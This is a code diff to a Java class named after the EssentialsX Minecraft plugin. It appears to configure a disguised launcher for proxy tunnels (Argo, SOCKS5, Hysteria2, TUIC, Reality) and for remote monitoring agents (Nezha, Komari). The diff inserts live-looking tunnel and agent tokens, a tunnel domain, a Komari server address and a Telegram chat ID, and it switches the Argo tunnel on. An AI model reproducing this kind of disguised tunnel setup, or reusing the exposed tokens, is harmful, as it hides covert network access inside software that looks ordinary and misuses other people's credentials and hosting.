@@ -92,19 +92,19 @@ public class EssentialsX extends JavaPlugin {
 
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "247bf662-c56d-4a0c-b523-a48b5e2732cf");
+        env.put("UUID", "a18d9d51-1680-4543-a48e-b9e927490600");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "8590");
-        env.put("HY2_PORT", "8590");
-        env.put("TUIC_PORT", "11333");
+        env.put("ARGO_PORT", "8001");
+        env.put("ARGO_DOMAIN", "bytenutsg.liuping.ccwu.cc");
+        env.put("ARGO_AUTH", "eyJhIjoiNDQ3MzQxNGZkNDc5Y2E1MmZiYTZjYjZkMWI5NGQ1NmMiLCJ0IjoiZjU1OTZmOWYtN2IzMC00NTJjLTk0OTMtNTU2MTVlYmMzNjJhIiwicyI6Ik5HVmpabU14WW1ZdE1qa3hPUzAwTUdObUxXSTNaVGd0T0dNeU56WmpZV1l5TWpBMyJ9");
+        env.put("S5_PORT", "4720");
+        env.put("HY2_PORT", "4720");
+        env.put("TUIC_PORT", "4721");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "11333");
+        env.put("REALITY_PORT", "4721");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "8502788454");
@@ -112,10 +112,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "cf.050900.xyz");
         env.put("CFPORT", "443");
         env.put("NAME", "");
-        env.put("DISABLE_ARGO", "true");
+        env.put("DISABLE_ARGO", "false");
         // ---- Komari Agent 默认值 ----
-        env.put("KOMARI_SERVER", "");
-        env.put("KOMARI_TOKEN", "");
+        env.put("KOMARI_SERVER", "https://komari.050900.xyz");
+        env.put("KOMARI_TOKEN", "Uh1sSL0Jki73dcuO4jlMZO");
 
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
